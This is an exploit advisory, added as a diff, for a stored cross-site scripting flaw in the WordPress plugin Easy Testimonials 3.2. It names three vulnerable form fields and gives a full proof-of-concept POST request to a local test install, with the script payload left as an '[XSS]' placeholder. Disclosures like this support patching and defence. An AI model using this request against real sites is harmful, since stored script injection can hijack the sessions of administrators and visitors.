@@ -1,0 +1,30 @@
+# Exploit Title: Wordpress Plugins Easy Testimonials 3.2 - Cross-Site Scripting
+# Date: 2018-11-23 
+# Exploit Author: En_dust
+# Vendor Homepage: https://wordpress.org/plugins/easy-testimonials/
+# Software Link: https://wordpress.org/plugins/easy-testimonials/
+# Version: 3.2
+# CVE : N/A
+# Tested on: Windows 10 x64
+
+# description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins easy testimonials 3.2.
+# Three parameters(_ikcf_client _ikcf_position _ikcf_other) have Cross-Site Scripting.
+
+# POC
+# XSS Stored
+ 
+POST http://localhost/wp-admin/post.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2152
+Referer: http://localhost/wp-admin/post-new.php?post_type=testimonial&wp-post-new-reload=true
+Cookie: wp-saving-post=25-check; wp-saving-post=22-saved; wordpress_524b5a925bc7b1b05f5b295d7fcd09b9=admin%7C1543134496%7CkuybvZvg3evKxitZn7s2lZSoaeDOfbTwXP0iMKFz425%7C481919de475c08441e455ffe01f4b8a241ea13f3a4255be476841ddc281597bc; wp-settings-time-1=1542959022; wp-settings-1=mfold%3Do%26libraryContent%3Dbrowse%26posts_list_mode%3Dexcerpt; PHPSESSID=au6fo2rac6sn2hgk0mnniq17k2; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_524b5a925bc7b1b05f5b295d7fcd09b9=admin%7C1543134496%7CkuybvZvg3evKxitZn7s2lZSoaeDOfbTwXP0iMKFz425%7C9bce6802e21d94bc37ab3eabf8dfe2950603d327e32a8ad14e167b4550d036dc
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+_wpnonce=b3ca69b020&_wp_http_referer=%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dtestimonial&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=testimonial&original_post_status=auto-draft&referredby=&_wp_original_http_referer=&auto_draft=&post_ID=25&meta-box-order-nonce=c25a6e37b2&closedpostboxesnonce=4784cc9ba9&post_title=test&samplepermalinknonce=f39f8eec26&content=test&wp-preview=&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&aa=2018&mm=11&jj=23&hh=17&mn=12&ss=56&hidden_mm=11&cur_mm=11&hidden_jj=23&cur_jj=23&hidden_aa=2018&cur_aa=2018&hidden_hh=17&cur_hh=17&hidden_mn=12&cur_mn=12&original_publish=%E5%8F%91%E5%B8%83&publish=%E5%8F%91%E5%B8%83&tax_input%5Beasy-testimonial-category%5D%5B%5D=0&neweasy-testimonial-category=%E6%96%B0%E5%88%86%E7%B1%BB%E7%9B%AE%E5%BD%95%E5%90%8D&neweasy-testimonial-category_parent=-1&_ajax_nonce-add-easy-testimonial-category=50d8975094&my-custom-fields_wpnonce=b074ff3409&_ikcf_client=[XSS]&_ikcf_email=test%40test.com&_ikcf_position=[XSS]&_ikcf_other=[XSS]&_ikcf_rating=1&excerpt=&metakeyselect=%23NONE%23&metakeyinput=&metavalue=&_ajax_nonce-add-meta=81df7811e1&post_name=&post_grid_post_settings_input_nonce=95c656b2da&_wp_http_referer=%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dtestimonial&post_grid_post_settings%5Bpost_skin%5D=flat&post_grid_post_settings%5Bcustom_thumb_source%5D=http%3A%2F%2Fwww.wordpress.com%2Fwp-content%2Fplugins%2Fpost-grid%2Fassets%2Ffrontend%2Fcss%2Fimages%2Fplaceholder.png&post_grid_post_settings%5Bfont_awesome_icon%5D=&post_grid_post_settings%5Bfont_awesome_icon_color%5D=737272&post_grid_post_settings%5Bfont_awesome_icon_size%5D=50px&post_grid_post_settings%5Bcustom_youtube_id%5D=&post_grid_post_settings%5Bcustom_vimeo_id%5D=&post_grid_post_settings%5Bcustom_dailymotion_id%5D=&post_grid_post_settings%5Bcustom_mp3_url%5D=&post_grid_post_settings%5Bcustom_soundcloud_id%5D=
